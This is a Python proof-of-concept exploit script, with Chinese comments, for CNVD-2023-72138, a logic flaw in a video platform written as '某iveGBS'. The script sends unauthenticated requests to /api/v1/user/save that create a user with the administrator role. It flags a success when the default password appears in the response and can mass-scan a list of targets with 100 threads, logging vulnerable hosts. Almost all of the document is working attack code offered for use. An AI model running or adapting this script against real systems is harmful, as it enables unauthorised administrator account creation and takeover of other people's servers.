#【CNVD-2023-72138】某iveGBS user_save 逻辑缺陷漏洞

import argparse,requests,sys,time,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m'
RESET = '\033[0m'

# banner信息
def banner():
    text = '''


 _        __                           _   _               _                _                    
(_)      / _|                         | | (_)             | |              | |                   
 _ _ __ | |_ ___  _ __ _ __ ___   __ _| |_ _  ___  _ __   | |     ___  __ _| | ____ _  __ _  ___ 
| | '_ \|  _/ _ \| '__| '_ ` _ \ / _` | __| |/ _ \| '_ \  | |    / _ \/ _` | |/ / _` |/ _` |/ _ \
| | | | | || (_) | |  | | | | | | (_| | |_| | (_) | | | | | |___|  __/ (_| |   < (_| | (_| |  __/
|_|_| |_|_| \___/|_|  |_| |_| |_|\__,_|\__|_|\___/|_| |_| \_____/\___|\__,_|_|\_\__,_|\__, |\___|
                                                                                       __/ |     
                                                                                      |___/                                                                
                                                                     version:CNVD-2023-72138 1.0
                                                                     Author: hi6
'''
    print(text)
def main():
    banner()
    #设置参数
    parser = argparse.ArgumentParser(description="某iveGBS user/save 逻辑缺陷漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help="input your link")
    parser.add_argument('-f','--file',dest='file',type=str,help="file path")
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        #处理数据，加线程
        url_list=[]
        with open('url.txt','r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")   

def poc(target):
    url_payload = '/api/v1/user/save?ID=&Username=test659&Role=%E7%AE%A1%E7%90%86%E5%91%98&Enable=true'
    url = target + url_payload
    # print(url)
    headers = {
        "Cache-Control": "max-age=0", 
        "Upgrade-Insecure-Requests": "1", 
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0", 
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", 
        "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6", 
        "Connection": "close"
        }
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    try:
        response = requests.get(url=url,headers=headers,proxies=proxies,timeout=5,verify=False)
        # print(response.text)
        #匹配响应包出现的内容
        if response.status_code == 200 and '12345678' in response.text:
            print( f"{GREEN}[+] {url} 存在逻辑缺陷漏洞！{RESET}")
            with open('result.txt','a')as f:
                f.write(target+'\n')
        else:
            print("[-] 漏洞不存在!!")
    except Exception as e:
        print(f'该站点有问题!!错误信息：{str(e)}')
if __name__ == '__main__':
    main()
